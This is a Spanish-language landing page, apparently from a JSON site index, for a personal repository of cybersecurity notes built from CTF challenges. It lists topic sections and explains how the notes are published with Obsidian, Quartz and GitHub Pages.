apuntes","links":["Hacking-√©tico/","Incidentes-de-ciberseguridad/","Normativa-de-ciberseguridad/","Seguridad-inform√°tica/","Redes-locales/","Servicios-en-red/","Despliegue-de-aplicaciones-web/"],"tags":[],"content":"Documentaci√≥n actual del repositorio\n\nDocumentaci√≥n sobre hacking √©tico\nDocumentaci√≥n sobre gesti√≥n de incidentes de ciberseguridad\nDocumentaci√≥n sobre normativa de ciberseguridad\nDocumentaci√≥n sobre seguridad inform√°tica\nDocumentaci√≥n sobre redes locales\nDocumentaci√≥n sobre servicios en red\nDocumentaci√≥n sobre despliegue de aplicaciones web\n\nQu√© es este proyecto\nEn primer lugar, para facilitar la comprensi√≥n, directamente enlazo a la web del proyecto, donde se puede usar: rafaeldelrio.github.io/\nEste proyecto surge de la necesidad de documentar de una forma c√≥moda y √∫til todo el conocimiento que se va generando a medida que se realizan distintos retos de ciberseguridad, tambi√©n conocidos como captura la bandera o CTF.\nA qui√©n va dirigido\nEste proyecto ha sido creado con el prop√≥sito, en primer lugar, de ser √∫til para m√≠ mismo. Es decir, que con el buscador avanzado de la web se pueda encontrar f√°cilmente informaci√≥n relevante, de forma que ayude en el proceso de solventar retos, especialmente en competiciones, donde el tiempo es primordial.\nC√≥mo puedo acceder al proyecto\nComo comentaba anteriormente, se puede acceder al proyecto directamente empleando la url: rafaeldelrio.github.io\nEl c√≥digo fuente de todo lo documentado se encuentra en: github.com/RafaeldelRio/rafaeldelrio.github.io\nC√≥mo puedo ayudar\nEs posible que te interese este proyecto y tengas bastante conocimiento sobre ciberseguridad que te gustar√≠a compartir. En ese caso genera la documentaci√≥n que creas que puede aportar y realizar un pull request.\nMe interesa, me gustar√≠a crear algo parecido para m√≠\nLa documentaci√≥n del proyecto ha sido creada con Obsidian. Son archivos markdown (.md).\nEstos archivos han sido desplegados empleando el proyecto Quartz.\nEl despliegue est√° hecho mediante github actions y github pages.\nSe puede seguir un tutorial paso a paso en la siguiente web:\nTutorial para desplegar el proyecto"}}